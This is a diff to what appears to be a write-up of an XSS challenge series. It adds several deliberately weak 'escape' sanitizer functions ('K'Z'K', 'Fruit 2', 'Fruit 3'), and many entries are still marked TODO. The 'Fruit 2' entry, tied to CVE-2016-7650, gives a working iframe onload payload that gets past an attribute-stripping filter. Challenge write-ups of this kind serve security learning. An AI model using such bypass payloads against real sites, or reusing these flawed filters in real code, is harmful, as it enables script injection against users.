@@ -902,7 +902,57 @@ function escape(s) {
 }
 ```
 
+TODO
 
+
+
+## K'Z'K
+
+```javascript
+// submitted by Stephen Leppik
+function escape(s) {
+    // remove vowels in honor of K'Z'K the Destroyer
+    s = s.replace(/[aeiouy]/gi, '');
+    return '<script>console.log("' + s + '");</script>';
+}
+```
+
+TODO
+
+
+
+## K'Z'K
+
+```javascript
+// submitted by Stephen Leppik
+function escape(s) {
+    // remove vowels and escape sequences in honor of K'Z'K 
+    // y is only sometimes a vowel, so it's only removed as a literal
+    s = s.replace(/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi, '')
+    // remove certain characters that can be used to get vowels
+    s = s.replace(/[{}!=<>]/g, '');
+    return '<script>console.log("' + s + '");</script>';
+}
+```
+
+TODO
+
+
+
+## K'Z'K
+
+```javascript
+// submitted by Stephen Leppik
+function escape(s) {
+    // remove vowels in honor of K'Z'K the Destroyer
+    s = s.replace(/[aeiouy]/gi, '');
+    // remove certain characters that can be used to get vowels
+    s = s.replace(/[{}!=<>\\]/g, '');
+    return '<script>console.log("' + s + '");</script>';
+}
+```
+
+TODO
 
 
 
@@ -949,3 +999,70 @@ Payload
 
 Output
 
+```
+<iframe onload="alert(1)"></iframe>
+```
+
+
+
+## Fruit 2
+
+```javascript
+// CVE-2016-7650
+function escape(s) {
+  var div = document.implementation.createHTMLDocument().createElement('div');
+  div.innerHTML = s;
+  function f(n) {
+    if (/script/i.test(n.tagName)) n.parentNode.removeChild(n);
+    for (var i=0; i<n.attributes.length; i++) {
+      var name = n.attributes[i].name;
+      if (name !== 'class') { n.removeAttribute(name); }
+    }
+  }
+  [].map.call(div.querySelectorAll('*'), f);
+  return div.innerHTML;
+}
+```
+
+和上一题差不多
+
+Payload
+
+```
+<iframe a onload=alert(1)>
+```
+
+Output
+
+```
+<iframe onload="alert(1)"></iframe>
+```
+
+
+
+## Fruit 3
+
+```javascript
+// Apple
+function escape(s) {
+  var div = document.implementation.createHTMLDocument().createElement('div');
+  div.innerHTML = s;
+  function f(n) {
+    if (/script/i.test(n.tagName)) n.parentNode.removeChild(n);
+    for (var i=0; i<n.attributes.length; i++) {
+      var name = n.attributes[i].name;
+      if (name !== 'class') { n.removeAttribute(name); i--; }
+    }
+  }
+  [].map.call(div.querySelectorAll('*'), f);
+  return div.innerHTML;
+}
+```
+
+TODO
+
+
+
+
+
+## 
